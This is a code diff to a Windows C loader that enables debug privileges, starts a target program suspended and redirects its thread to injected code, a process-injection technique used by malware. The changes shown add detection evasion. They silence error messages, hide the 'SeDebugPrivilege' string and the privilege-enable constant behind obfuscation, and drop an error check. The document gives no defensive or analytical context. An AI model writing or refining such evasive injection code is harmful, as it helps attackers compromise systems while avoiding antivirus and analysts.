@@ -60,7 +60,7 @@ HMODULE LoadCleanDLL(char* dllPath) {
     }
     else
     {
-        printf("[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
+        // printf("[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
     }
 
     return hDLL;
@@ -368,7 +368,7 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Requesting S DBG PVG...\n");
     if (!pOPT(pGCP(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        printf("[!] OPT failed, error: %lu\n", GetLastError());
+        // printf("[!] OPT failed, error: %lu\n", GetLastError());
         return 1;
     }
 
@@ -379,7 +379,7 @@ int main(int argc, char* argv[]) {
 
     char* strSEDBG = (char*)malloc(sizeof(SEDBG_ENC));
     if (!strSEDBG) {
-        printf("[ERROR] Memory allocation failed for SeDebugPrivilege\n");
+        printf("[ERROR] Memory allocation failed for S DBG PVG\n");
         return 1;
     }
     memcpy(strSEDBG, SEDBG_ENC, sizeof(SEDBG_ENC));
@@ -387,20 +387,19 @@ int main(int argc, char* argv[]) {
 
 
     if (!pLPVA(NULL, strSEDBG, &luid)) {
-        printf("[!] LPVA failed, error: %lu\n", GetLastError());
+        // printf("[!] LPVA failed, error: %lu\n", GetLastError());
         return 1;
     }
     tp.PrivilegeCount = 1;
-    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
+    DWORD se_enabled_obfuscated = 0xA5 ^ 0xA7;  // 0x02
+    tp.Privileges->Attributes = se_enabled_obfuscated;
+    // tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
     tp.Privileges->Luid = luid;
     if (!pATP(hToken, FALSE, &tp, 0, NULL, NULL)) {
-        printf("[!] ATP failed, error: %lu\n", GetLastError());
+        // printf("[!] ATP failed, error: %lu\n", GetLastError());
         return 1;
     }
-    if (GetLastError() != ERROR_SUCCESS) {
-        printf("[!] ATP reported an error: %lu\n", GetLastError());
-        return 1;
-    }
+
     printf("[+] S DBG PVG enabled.\n");
 
     // Obtain the target executable path (from command line or stdin)
@@ -435,7 +434,7 @@ int main(int argc, char* argv[]) {
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
     if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("[ERROR] Error creating the process, code: %lu\n", GetLastError());
+        // printf("[ERROR] Error creating the process, code: %lu\n", GetLastError());
         free(exePathW);
         return 1;
     }
@@ -483,7 +482,7 @@ int main(int argc, char* argv[]) {
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_CONTROL;
     if (!pGTC(pi.hThread, &ctx)) {
-        printf("[ERROR] GTC failed: %lu\n", GetLastError());
+        // printf("[ERROR] GTC failed: %lu\n", GetLastError());
         return 1;
     }
 #ifdef _WIN64
@@ -492,7 +491,7 @@ int main(int argc, char* argv[]) {
     ctx.Eip = (DWORD)remoteBaseAddress;
 #endif
     if (!pSTC(pi.hThread, &ctx)) {
-        printf("[ERROR] STC failed: %lu\n", GetLastError());
+        // printf("[ERROR] STC failed: %lu\n", GetLastError());
         return 1;
     }
 
